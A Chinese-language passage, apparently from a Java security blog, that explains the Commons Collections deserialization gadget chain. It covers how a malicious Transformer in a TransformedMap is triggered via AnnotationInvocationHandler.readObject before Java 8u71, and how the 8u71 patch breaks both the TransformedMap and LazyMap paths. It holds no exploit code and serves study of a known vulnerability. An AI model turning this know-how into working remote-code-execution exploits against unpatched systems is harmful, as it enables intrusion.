`TransformedMap.decorate` 包装了一个 `Map`，并设置了一个恶意 `Transformer`，`TransformedMap` 在调用`Map.Entry.setValue` 的时候，会触发 `transformer.transform(value)`，在 gadget 链里，利用 `AnnotationInvocationHandler` 的反序列化逻辑，最终会调用到 `Map.Entry.setValue`，触发恶意代码。

而利用 `AnnotationInvocationHandler` 主要用的是 `readObject`方法的反序列化操作，

+ 在  Java 8u71 之前：

`readObject`方法在反序列化时会遍历 `Map` 中的 `entry`，调用 `entry.setValue()` 来调整键值。于是恶意的 `TransformedMap entry` 会被调用 `setValue`，从而执行 `transform()`。

+ 在 Java 8u71 之后：

[https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d](https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d)

![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810069.png)

 新建一个`LinkedHashMap`，对值的修正，改成了 `value = new ...`，而不是直接调用`entry.setValue`，后续的操作都是针对`LinkedHashMap`。这样一来，`streamVals`就不会去调用 `setValue`，它只是作为一个输入被读取了一遍，然后就进入了`LinkedHashMap`，不会触发恶意方法。

所以说，漏洞的修复和 `setValue`关系不大，

> 《Java 安全漫谈》
>
> 对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接
>
> 使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。
>
> 所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执
>
> 行set或put操作，也就不会触发RCE了。
>



## 2、 LazyMap
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810672.png)

原来 `readObject` 会通过 `memberValues.get(name)` 或者 `entry.setValue(...)` 间接调用 `Map` 的查找/写入方法，现在改为遍历反序列化出来的 `streamVals.entrySet()`、直接读取 `entry.getValue()` 并把值复制到一个新的 `LinkedHashMap`，然后用 `Unsafe`  直接在内存里把对象字段的引用一次性写入  。这样就切断了触发 LazyMap.transform 的路径。  













































































